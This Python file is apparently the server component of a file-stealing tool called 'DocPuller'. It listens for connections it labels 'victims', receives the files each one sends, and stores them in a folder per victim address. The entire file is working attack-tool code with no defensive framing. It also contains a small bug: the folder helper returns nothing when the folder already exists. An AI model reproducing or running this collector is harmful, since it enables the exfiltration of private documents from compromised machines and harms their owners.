__author__ = 'ben'

import os
import socket
import threading

from DocPullerScripts.DocPullerFTP.protocol import Protocol


class Server(Protocol):

    def __init__(self, server, port, file_path):
        super().__init__(server, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR)
        self.file_path = file_path
        print("""
  ____             ____        _ _           
 |  _ \  ___   ___|  _ \ _   _| | | ___ _ __ 
 | | | |/ _ \ / __| |_) | | | | | |/ _ \ '__|
 | |_| | (_) | (__|  __/| |_| | | |  __/ |   
 |____/ \___/ \___|_|    \__,_|_|_|\___|_|   
                                             
        """)

    def __open_victim_folder(self, addr):
        path = f'{self.file_path}/{addr}'
        if not os.path.exists(path):
            os.mkdir(path)
            return path

    def handle_victim(self, conn, addr):
        connected = True
        print('connection', addr)
        amount_of_file = 0
        folder = self.__open_victim_folder(addr)
        while connected:
            file_name, file_data = self.recv_file(conn)
            if file_name.decode() == self.DISCONNECT_MSG:
                connected = False
                continue
            if file_name:
                file_name = file_name.decode()
                with open(f'{folder}/{file_name}', 'wb') as f:
                    f.write(file_data)
                amount_of_file += 1
        else:
            print(addr, 'sent {} amount of files'.format(amount_of_file))
            print(addr, 'disconnected')
            conn.close()

    def start(self):
        self.server.listen()
        print(f'LISTENING... ({self.SERVER}:{self.PORT})')
        try:
            while True:
                conn, addr = self.server.accept()
                thread = threading.Thread(target=self.handle_victim, args=(conn, addr))
                thread.start()
        except Exception as e:
            print(e)
            self.server.close()


if __name__ == '__main__':
    print('SERVER IS STARTING :)')
    Server('localhost', 8830, '/Users/benalaluf/Desktop').start()
